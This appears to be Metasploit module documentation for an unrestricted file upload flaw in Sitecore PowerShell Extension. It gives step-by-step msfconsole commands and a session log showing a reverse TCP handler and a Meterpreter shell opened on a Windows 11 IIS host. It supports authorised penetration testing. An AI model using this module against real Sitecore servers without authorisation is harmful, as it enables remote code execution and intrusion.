## Vulnerable Application

The Sitecore Experience Platform (XP) is a flagship CMS product.
Provides comprehensive digital marketing tools, view of customer data and many other features.
A user can install multiple extensions to Sitecore XP - among them is Sitecore PowerShell Extension (SPA).
It is obligatory requirement for popular SXA add-on.
The SPA is vulnerable to an unrestricted file upload up to version 7.0.
An attacker can upload malicious ASPX file and gain remote code execution.


### Installation

The Sitecore XP can be downloaded from [here](https://developers.sitecore.com/downloads/Sitecore_Experience_Platform).
Please note that a license is required for successful installation.


## Verification Steps

1. Install the application
1. Start msfconsole
1. Do: `use exploit/windows/http/sitecore_xp_cve_2025_34511`
1. Do: `set RHOSTS [Sitecore XP IP address]`
1. Do: `set VHOST [Sitecore XP hostname]`
1. Do: `set IDENTITY_VHOST [hostname of Sitecore XP identity server]`
1. Do: `set LHOST [attacker IP]`
1. Do: `run`

## Options


### VHOST

The hostname of Sitecore XP.
When installed, Sitecore XP deploys multiple vhosts, among them is the Sitecore XP host, where a user can access majority of functions.


### IDENTITY_VHOST

The Sitecore XP uses separate vhost for "identity host", which is used when user is authenticating and asking for session data.
If you are not sure about `IDENTITY_VHOST`, you can visit `https://[sitecore instance]/identity/login/shell/SitecoreIdentityServer`.
The hostname of page where the URL will redirect you can be used as `IDENTITY_VHOST`.


## Scenarios


```
msf exploit(windows/http/sitecore_xp_cve_2025_34511) > set IDENTITY_VHOST sitecorepocidentityserver.dev.local
msf exploit(windows/http/sitecore_xp_cve_2025_34511) > set RHOSTS 10.5.132.138
RHOSTS => 10.5.132.138
msf exploit(windows/http/sitecore_xp_cve_2025_34511) > set VHOST sitecorepocsc.dev.local
VHOST => sitecorepocsc.dev.local
msf exploit(windows/http/sitecore_xp_cve_2025_34511) > set IDENTITY_VHOST sitecorepocidentityserver.dev.local
IDENTITY_VHOST => sitecorepocidentityserver.dev.local
msf exploit(windows/http/sitecore_xp_cve_2025_34511) > run verbose=true 
[*] Started reverse TCP handler on 192.168.3.7:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable. Sitecore version detected 10.3.0, which is vulnerable
[*] Sending stage (203846 bytes) to 10.5.132.138
[*] Meterpreter session 1 opened (192.168.3.7:4444 -> 10.5.132.138:50194) at 2025-08-26 12:58:22 +0200

meterpreter > sysinfo
Computer        : WIN11_22H2_0800
OS              : Windows 11 22H2 (10.0 Build 22621).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows
meterpreter > getuid
Server username: IIS APPPOOL\sitecorepocsc.dev.local
```
